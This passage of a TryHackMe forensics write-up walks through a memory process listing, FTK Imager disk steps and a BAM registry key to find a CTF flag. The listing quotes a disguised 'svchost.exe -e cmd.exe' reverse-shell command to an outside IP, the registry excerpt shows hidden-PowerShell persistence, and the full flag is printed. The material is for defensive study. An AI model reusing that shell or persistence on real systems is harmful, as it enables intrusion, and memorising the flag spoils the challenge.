**** 2736	1036	conhost.exe	0xd28d6a19d080	3	-	3	False	2024-05-14 22:06:21.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\conhost.exe	\??\C:\Windows\system32\conhost.exe 0x4	C:\Windows\system32\conhost.exe
**** 3580	1036	notepad.exe	0xd28d6bc4a080	4	-	3	False	2024-05-14 22:06:22.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\notepad.exe	"C:\Windows\system32\NOTEPAD.EXE" C:\Users\Bobby\Documents\tmp\part2.txt	C:\Windows\system32\NOTEPAD.EXE
**** 5228	1036	svchost.exe	0xd28d6ad4e080	3	-	3	False	2024-05-14 22:06:22.000000 	N/A	\Device\HarddiskVolume1\Tools\svchost.exe	"C:\Tools\svchost.exe" -e cmd.exe 10.14.74.53 6996 	C:\Tools\svchost.exe
```

<img width="1783" height="191" alt="image" src="https://github.com/user-attachments/assets/dfec610e-6507-44f5-b22a-2e2277b6e69d" />

<img width="1786" height="191" alt="image" src="https://github.com/user-attachments/assets/3b3dd141-55ca-4808-9577-f92381c5ed1b" />

<br>
<br>
<br>

<p>1.2. <em>The answer above shares the same parent process with another binary that references a .txt file - what is the full path of this .txt file?</em><br>
<code>C:\Users\Bobby\Documents\tmp\part2.txt</code></p>



<h2>Task 2 . Disk</h2>

<p>The disk image can be found in drive D:\Disk. You can also opt to connect to the machine via RDP using the credentials below.</p>

<p>
  
- Username:
- Password:</p>

<p><em>Answer the questions below</em></p>

<p>2.1. <em>What binary gives the most apparent sign of suspicious activity in the given disk image? Use the full path of the artefact.</em>Hint: Auto connects to what? Is connector.ps1 downloaded or created?<br>
<code>C:\Tools\windows-networking-tools-master\windows-networking-tools-master\LatestBuilds\x64\Autoconnector.exe</code></p>



<img width="1384" height="510" alt="image" src="https://github.com/user-attachments/assets/6ff4cddc-4954-49fd-a7d0-a09259741632" />

<img width="1392" height="310" alt="image" src="https://github.com/user-attachments/assets/974890ed-1ddf-4d78-9859-a1cfdd63a171" />

<img width="1385" height="387" alt="image" src="https://github.com/user-attachments/assets/290cffcb-cdc1-494d-b8cb-c92295be92e8" />

<img width="1379" height="805" alt="image" src="https://github.com/user-attachments/assets/0bc2579a-4e57-4279-a4d0-e7c985aefd64" />


<p>
  
- launch <strong>FTK Imager</strong></p>

<img width="1205" height="101" alt="image" src="https://github.com/user-attachments/assets/b57cdefc-3834-4d3f-a65a-5e9b54043079" />

<p>
  
- select <strong>File</strong> > <strong>Add Evidence Item...</strong><br>
- select <strong>IMage File</strong> > <strong>Next</strong> > <strong>Browse...</strong><br>
- double-click <strong>Disk</strong><br>
- click <strong>Robert.dd</strong><br>
- <strong>Open</strong> > <strong>Finish</strong><br>
- expand <strong>Robert.dd</strong> > <strong>root</strong> > <strong>Bobby</strong> > <strong>Documents</strong> > <strong>tmp</strong><br>
- identify <code>connector.ps1</code> and <code>part2.txt</code></p>

<img width="1368" height="464" alt="image" src="https://github.com/user-attachments/assets/4ad55ad6-32dc-4355-a771-1ea28b199e5a" />


<p>

- navigate to the <strong>autoconnect</strong> path<br>
- right-click <strong>Autoconnect</strong><br>
- select <strong>Export file Hash List...</strong> and save it<br>
- open the hashes´ file</p>


<img width="1327" height="728" alt="image" src="https://github.com/user-attachments/assets/c3d169b0-bf6f-4b1a-9c28-bf243b95039b" />

<br>
<br>
<br>
<p>2.2. <em>What is the full registry path where the existence of the binary above is confirmed?</em> Hint: Hits you right in the face... bam!<br>
<code>HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\bam\State\UserSettings\S-1-5-21-1966530601-3185510712-10604624-1008</code></p>

<p>

- navigate to the <strong>Autoconnect.exe</strong> path<br>
- right-click it<br>
- select <strong>Export file Hash List...</strong> and save it<br>
- open the hashes´ file<br>
- search the MD5 hash in <strong>VirusTotal</strong><p>

<img width="1028" height="82" alt="image" src="https://github.com/user-attachments/assets/fadb5ce9-eca0-4b60-81fc-c0844351fd4b" />

<img width="1889" height="898" alt="image" src="https://github.com/user-attachments/assets/6a42d1f2-e343-4cdb-b63d-dff1976d3554" />

<img width="1900" height="288" alt="image" src="https://github.com/user-attachments/assets/a592d191-4ccc-4e85-947e-980c3326ac98" />


<p>

- " \\Classes\\svcnotes"<br>
- " \\Classes\\svcnotes\\fl.ag"<br>
- " ••••••••••••••••• "<br>
- "(Default) : Powershell -windowstyle hidden "<br>
- "(Default) : VEhNezZsNERfeTB1X2tOT3d"</p>


<img width="1882" height="893" alt="image" src="https://github.com/user-attachments/assets/91da21d4-eb6f-4f14-a7f0-5c5f2241dbea" />



<img width="1316" height="494" alt="image" src="https://github.com/user-attachments/assets/2302f4b9-dead-4f96-9daf-6a1ce59a40c2" />

<img width="1252" height="562" alt="image" src="https://github.com/user-attachments/assets/16b4fc6b-ce10-4255-8a0a-7d6f2f32561b" />

<img width="1335" height="801" alt="image" src="https://github.com/user-attachments/assets/7055690d-b4ce-4021-bcb3-f14f062a91ab" />


<img width="1335" height="502" alt="image" src="https://github.com/user-attachments/assets/7d02bab5-9999-4fbe-908d-11827de041eb" />

<img width="1336" height="324" alt="image" src="https://github.com/user-attachments/assets/7f7c7baf-b169-4c4c-b825-8019d2b0b39a" />

<img width="1333" height="380" alt="image" src="https://github.com/user-attachments/assets/36b347e0-4e2c-4992-970b-2d6f39712a25" />


```bash
Registry file: C:\Users\Administrator\Desktop\config\SYSTEM
Key: ControlSet001\Services\bam\State\UserSettings\S-1-5-21-1966530601-3185510712-10604624-1008
Last write: 5/14/2024 9:30:04 PM +00:00
Value: \Device\HarddiskVolume1\Tools\windows-networking-tools-master\windows-networking-tools-master\LatestBuilds\x64\Autoconnector.exe (RegBinary)
```

<br>
<p>2.3. <em>What is the content of "Part2"?</em><br>
<code>•••••••••••••••••</code></p>

<img width="1365" height="470" alt="image" src="https://github.com/user-attachments/assets/4f267f2b-2243-4c0a-9698-90f52c20b00a" />

<br>
<br>
<br>
<p>2.4. <em>What is the flag?</em><br>
<code>THM{6l4D_y0u_kNOw••••••••••••}</code></p>

THM{6l4D_y0u_kNOw_h0w_2_p1vOT}

<br>
<br>
<h1 align="center">Completed</h1>

<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/93055a1a-71d2-4a5a-a217-765e8a413a43"><br><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/0f99a2cd-d3d1-4065-a3b4-02e421fbe036"></p>


<h1 align="center">My TryHackMe Journey ・ 2026, January</h1>

<div align="center"><h6>

| Date<br><br>   | Room <br><br> |Streak<br><br>   |Global<br>All Time|Brazil<br>All Time|Global<br>Monthly|Brazil<br>Monthly|Points<br><br>|Rooms<br>Completed|Badges<br><br>|
|:------:|:--------------------------------------|:--------:|:------------:|:------------:|:------------:|:------------:|:------------:|:------------:|:------------:|
|7      |Hard 🚩 - Dead End?                   |6 |     99ᵗʰ  |     3ʳᵈ    |    2,924ᵗʰ   |       37ᵗʰ     |    136,788  |    1,060    |    84     |
|6      |Easy 🔗 - Linux Strength Training     |5 |     98ᵗʰ  |     3ʳᵈ    |    3,172ⁿᵈ   |       47ᵗʰ     |    136,608  |    1,059    |    84     |
|4      |Medium 🚩 - JVM Reverse Engineering   |3 |     96ᵗʰ  |     3ʳᵈ    |    3,031ˢᵗ   |       46ᵗʰ     |    136,450  |    1,058    |    84     |
|3      |Medium 🚩 - Carrotbane of My Existence|2 |     96ᵗʰ  |     3ʳᵈ    |    3,468ᵗʰ   |       49ᵗʰ     |    136,150  |    1,057    |    84     |
|2      |Easy 🔗 - Learn Rust                  |1 |     96ᵗʰ  |     3ʳᵈ    |    5,152ⁿᵈ   |       67ᵗʰ     |    136,030  |    1,056    |    84     |


</h6></div><br>

<p align="center">Global All Time:    99ᵗʰ<br><img width="250px" src="https://github.com/user-attachments/assets/b25380c6-cb6f-4a10-a2d2-a3003723bf1b"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/10d08cc1-55f8-4e24-89e7-1bcc11ee3789"><br><br>
                  Brazil All Time:      3ʳᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/0133ac67-7e44-4614-9901-8d60b4b7c23b"><br><br>
                  Global monthly:    2,924ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/60dae2cf-9c32-47a5-bda8-d73ea8efe008"><br><br>
                  Brazil monthly:      37ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/7f088acc-ea64-486c-ba79-46fd8f9b17cd"></p>

<h1 align="center">Thanks for coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>


<img width="1914" height="283" alt="image" src="https://github.com/user-attachments/assets/f56b64a6-3a69-404d-8905-c44794c9c1f3" />





